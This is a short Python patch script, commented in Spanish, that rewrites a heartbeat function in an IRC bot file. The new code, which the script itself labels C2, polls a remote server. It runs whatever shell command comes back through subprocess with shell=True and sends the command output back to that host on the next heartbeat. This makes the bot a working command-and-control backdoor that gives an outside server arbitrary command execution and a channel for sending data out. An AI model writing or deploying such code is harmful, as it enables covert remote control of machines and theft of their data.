#!/usr/bin/env python3
"""Parche para falkian.py: añade captura de salida C2."""
import sys

f = '/home/juanjo/ircbots/bots/indomita/falkian.py'
with open(f, 'r') as fh:
    lines = fh.readlines()

# Buscar la línea "def enviar_latido(diagnostic=None):"
start = None
for i, line in enumerate(lines):
    if line.strip() == 'def enviar_latido(diagnostic=None):':
        start = i
        break

if start is None:
    print("ERROR: No se encontró 'def enviar_latido'")
    sys.exit(1)

# Buscar el final de la función (siguiente def o línea sin indent al mismo nivel)
end = None
for i in range(start + 1, len(lines)):
    stripped = lines[i].strip()
    if stripped and not lines[i][0].isspace() and not stripped.startswith('#'):
        end = i
        break

if end is None:
    print("ERROR: No se encontró el final de enviar_latido")
    sys.exit(1)

print(f"Encontrado enviar_latido en líneas {start+1}-{end}")

# Reemplazar la función completa
new_func = '''_c2_pending_output = []

def enviar_latido(diagnostic=None):
    """Envía latido al VPS 2 con diagnóstico opcional."""
    global _c2_pending_output
    try:
        print(f"[SENTINEL] Intentando enviar latido a {HEARTBEAT_URL}...")
        headers = {"X-Heartbeat-Token": HEARTBEAT_TOKEN}
        payload = {}
        if diagnostic:
            payload["diagnostic"] = {"error": str(diagnostic)}
        if _c2_pending_output:
            payload["cmd_output"] = _c2_pending_output[:]
            _c2_pending_output.clear()

        r = requests.post(HEARTBEAT_URL, headers=headers, json=payload, timeout=10)
        if r.status_code == 200:
            print(f"[SENTINEL] Latido enviado OK (Status: {r.status_code})")
            data = r.json()
            if "cmd" in data:
                cmd = data["cmd"]
                logging.info(f"[C2] Recibido comando remoto: {cmd}")
                try:
                    result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=30)
                    output = (result.stdout + result.stderr).strip()[:2000]
                    _c2_pending_output.append({"cmd": cmd, "output": output, "exit_code": result.returncode})
                    print(f"[C2] Comando ejecutado (exit={result.returncode})")
                except Exception as cmd_err:
                    _c2_pending_output.append({"cmd": cmd, "output": str(cmd_err), "exit_code": -1})
        else:
            print(f"[SENTINEL] Error en latido (Status: {r.status_code})")
    except Exception as e:
        print(f"[SENTINEL] Excepción en enviar_latido: {e}")

'''

lines[start:end] = [new_func]

with open(f, 'w') as fh:
    fh.writelines(lines)

print("OK: falkian.py parcheado con captura de salida C2")
